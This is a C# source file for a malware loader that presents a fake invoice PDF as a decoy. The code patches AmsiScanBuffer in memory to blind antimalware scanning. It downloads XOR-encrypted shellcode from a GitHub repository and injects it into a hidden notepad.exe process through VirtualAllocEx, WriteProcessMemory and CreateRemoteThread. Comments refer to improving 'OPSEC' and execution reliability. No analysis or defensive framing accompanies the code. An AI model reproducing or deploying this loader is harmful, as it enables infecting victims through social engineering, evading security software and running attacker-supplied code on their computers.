using System;
using System.Net;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

public class EvasionExecutor
{
    // --- Win32 Structures ---
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
    [StructLayout(LayoutKind.Sequential)]
    internal struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

    // --- Win32 API Functions ---
    [DllImport("kernel32.dll")] private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    [DllImport("kernel32.dll")] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    
    // REPLACED QueueUserAPC with the more reliable CreateRemoteThread
    [DllImport("kernel32.dll")] private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    // Standard Functions
    [DllImport("kernel32.dll")] private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] private static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    private static byte[] xorKey = new byte[] { 0x69, 0x30, 0x78, 0x75, 0x46, 0x6e, 0x5a, 0x4f, 0x66, 0x36, 0x39, 0x58, 0x37, 0x62, 0x6b, 0x74, 0x66, 0x33, 0x56, 0x73 };

    public void Trigger()
    {
        // --- NEW LOGICAL ORDER FOR BETTER OPSEC ---

        // 1. Patch AMSI in the current process immediately.
        PatchMem();

        // 2. Launch the decoy immediately. This provides instant, benign user feedback.
        RunDecoy();

        // 3. Download the payload in the background.
        byte[] shellcode = DownloadAndDecryptPayload();

        // 4. Inject the payload into a sacrificial process.
        if (shellcode != null && shellcode.Length > 0)
        {
            InjectAndExecute(shellcode);
        }
    }
    
    private void InjectAndExecute(byte[] shellcode)
    {
        // We will inject into a hidden instance of notepad.exe
        string targetProcess = "C:\\Windows\\SysWOW64\\notepad.exe"; 
        
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        // Add SW_HIDE flag to make the notepad window invisible
        si.dwFlags = 0x1; // STARTF_USESHOWWINDOW
        si.wShowWindow = 0; // SW_HIDE

        // Note: We no longer need to create it suspended.
        bool success = CreateProcess(null, targetProcess, IntPtr.Zero, IntPtr.Zero, false, 0x00000008 | 0x04000000, IntPtr.Zero, null, ref si, out pi); // CREATE_NO_WINDOW | DETACHED_PROCESS

        if (success)
        {
            IntPtr remoteAddr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); // RWX
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteAddr, shellcode, (uint)shellcode.Length, out bytesWritten);
            
            // --- THE FIX ---
            // Use CreateRemoteThread for reliable execution.
            uint threadId;
            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out threadId);
        }
    }
    
    private byte[] DownloadAndDecryptPayload()
    {
        try
        {
            using (WebClient client = new WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36");
                byte[] encryptedShellcode = client.DownloadData("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor");
                byte[] shellcode = new byte[encryptedShellcode.Length];
                for (int i = 0; i < encryptedShellcode.Length; i++) { shellcode[i] = (byte)(encryptedShellcode[i] ^ xorKey[i % xorKey.Length]); }
                return shellcode;
            }
        }
        catch { return null; }
    }
    
    private void RunDecoy()
    {
        try
        {
            using (WebClient pdfClient = new WebClient())
            {
                string tempPdfPath = Path.GetTempPath() + "Invoice-" + Path.GetRandomFileName().Substring(0, 8) + ".pdf";
                pdfClient.DownloadFile("https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice%20for%20Load%20ID%2080814532.pdf", tempPdfPath);
                Process.Start(tempPdfPath);
            }
        }
        catch { }
    }

    private void PatchMem()
    {
        try
        {
            string lib = "am" + "si" + ".dll";
            string func = "Amsi" + "Scan" + "Buffer";
            IntPtr libHandle = LoadLibrary(lib);
            IntPtr funcAddress = GetProcAddress(libHandle, func);
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            uint oldProtect;
            VirtualProtect(funcAddress, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, funcAddress, patch.Length);
            VirtualProtect(funcAddress, (UIntPtr)patch.Length, oldProtect, out oldProtect);
        }
        catch { }
    }
}
